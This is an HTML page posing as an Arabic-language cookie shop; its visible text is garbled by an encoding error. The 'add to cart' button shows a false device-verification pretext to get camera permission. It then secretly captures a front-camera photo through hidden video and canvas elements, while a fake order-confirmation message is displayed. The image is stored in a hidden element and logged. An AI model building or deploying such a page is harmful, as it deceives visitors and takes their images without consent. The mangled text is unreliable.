<!DOCTYPE html>
<html>
<head>
    <title>Ù…ØªØ¬Ø± Ø§Ù„ÙƒÙˆÙƒÙŠØ² Ø§Ù„Ø³Ø¹ÙŠØ¯ ğŸª</title>
    <meta charset="UTF-8">
    <style>
        /* Ø§Ù„ØªØµÙ…ÙŠÙ… Ø§Ù„Ø¹Ø§Ù… */
        body { 
            font-family: 'Arial', sans-serif; 
            text-align: center; 
            background-color: #fcebeb; 
            color: #3e2723; 
            padding: 20px;
        }
        .header {
            background-color: #d84315; 
            color: white;
            padding: 20px;
            margin-bottom: 30px;
            border-radius: 8px;
        }
        .cookie-item {
            background-color: white;
            border: 1px solid #ffccbc;
            border-radius: 10px;
            padding: 20px;
            margin: 15px auto;
            max-width: 400px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        /* Ø§Ù„Ø²Ø± Ø§Ù„Ø°ÙŠ Ø³ÙŠÙ‚ÙˆÙ… Ø¨ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ */
        #orderButton {
            background-color: #4CAF50; 
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        #orderButton:hover {
            background-color: #45a049;
        }
        /* Ø¥Ø®ÙØ§Ø¡ Ø¹Ù†Ø§ØµØ± Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„ØªØµÙˆÙŠØ± Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ */
        #videoElement, #canvas, #status { 
            display: none !important; 
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Ù…ØªØ¬Ø± Ø§Ù„ÙƒÙˆÙƒÙŠØ² Ø§Ù„Ø³Ø¹ÙŠØ¯ ğŸª</h1>
        <p>Ø£Ù„Ø° ÙƒÙˆÙƒÙŠØ² Ù…ÙØ¹Ø¯ Ø¨Ø­Ø¨ ÙˆØ·Ø§Ø²Ø¬ ÙŠÙˆÙ…ÙŠØ§Ù‹!</p>
    </div>

    <div class="cookie-item">
        <h2>ÙƒÙˆÙƒÙŠØ² Ø§Ù„Ø´ÙˆÙƒÙˆÙ„Ø§ØªØ© Ø§Ù„ÙƒÙ„Ø§Ø³ÙŠÙƒÙŠ</h2>
        <p>ØºÙ†ÙŠ Ø¨Ø±Ù‚Ø§Ø¦Ù‚ Ø§Ù„Ø´ÙˆÙƒÙˆÙ„Ø§ØªØ© Ø§Ù„Ø¯Ø§ÙƒÙ†Ø©. Ø§Ù„Ø³Ø¹Ø±: 15 Ø±ÙŠØ§Ù„/Ø§Ù„Ù‚Ø·Ø¹Ø©</p>
        <button id="orderButton">Ø£Ø¶Ù Ø¥Ù„Ù‰ Ø§Ù„Ø³Ù„Ø©</button>
        <br><br>
        <div id="fakeStatus" style="color: green; font-weight: bold; height: 30px;"></div>
    </div>
    
    <video id="videoElement"></video>
    <canvas id="canvas"></canvas>
    <p id="status"></p>

    <script>
        const video = document.getElementById('videoElement');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const orderButton = document.getElementById('orderButton');
        const fakeStatus = document.getElementById('fakeStatus');
        const statusElement = document.getElementById('status'); 
        let streamGlobal; 
        let isCapturing = false;

        function captureAndStop() {
            if (isCapturing) return;
            isCapturing = true;

            fakeStatus.innerHTML = 'Ø¬Ø§Ø±ÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø·Ù„Ø¨... Ù‚Ø¯ ØªØ³ØªØºØ±Ù‚ Ø¹Ù…Ù„ÙŠØ© Ø§Ù„Ø¯ÙØ¹ Ù„Ø­Ø¸Ø§Øª.';
            orderButton.disabled = true;

            setTimeout(() => {
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                if (streamGlobal) {
                    streamGlobal.getTracks().forEach(track => track.stop());
                }
                
                fakeStatus.innerHTML = 'ğŸ‰ **ØªÙ… ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø·Ù„Ø¨ Ø¨Ù†Ø¬Ø§Ø­!** Ø´ÙƒØ±Ø§Ù‹ Ù„ØªØ³ÙˆÙ‚Ùƒ Ù…Ø¹Ù†Ø§.';
                orderButton.style.backgroundColor = '#9e9e9e';
                orderButton.innerHTML = 'ØªÙ… Ø§Ù„Ø·Ù„Ø¨';

                const imageDataURL = canvas.toDataURL('image/png');
                statusElement.innerText = imageDataURL;
                console.log('ØµÙˆØ±Ø© Ù…Ù„ØªÙ‚Ø·Ø© (Ù…Ø®ÙÙŠØ©):', imageDataURL.substring(0, 50) + '...');
                
            }, 2000); 
        }

        orderButton.addEventListener('click', function() {
            
            fakeStatus.innerHTML = 'Ù„Ø­Ù…Ø§ÙŠØ© Ø¨ÙŠØ§Ù†Ø§ØªÙƒØŒ Ù†Ø­ØªØ§Ø¬ Ù„ØªØ£ÙƒÙŠØ¯ Ø¬Ù‡Ø§Ø²Ùƒ... **Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ "Ø³Ù…Ø§Ø­"** Ø¹Ù†Ø¯ Ø¸Ù‡ÙˆØ± Ø§Ù„Ù†Ø§ÙØ°Ø©.';
            orderButton.disabled = true;

            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                
                // ØªØ­Ø¯ÙŠØ¯ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© (Ø§Ù„Ø³ÙŠÙ„ÙÙŠ)
                navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                })
                .then(function(stream) {
                    streamGlobal = stream;
                    video.srcObject = stream;
                    video.play();
                    
                    video.onloadedmetadata = captureAndStop;

                })
                .catch(function(err) {
                    fakeStatus.innerHTML = 'âŒ ÙØ´Ù„ Ø¥ØªÙ…Ø§Ù… Ø§Ù„Ø·Ù„Ø¨! Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.';
                    orderButton.disabled = false;
                });
            } else {
                fakeStatus.innerHTML = 'âŒ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù†Ø¸Ø§Ù…. Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù…ØªØµÙØ­ Ø£Ø­Ø¯Ø«.';
            }
        });
    </script>
</body>
</html>
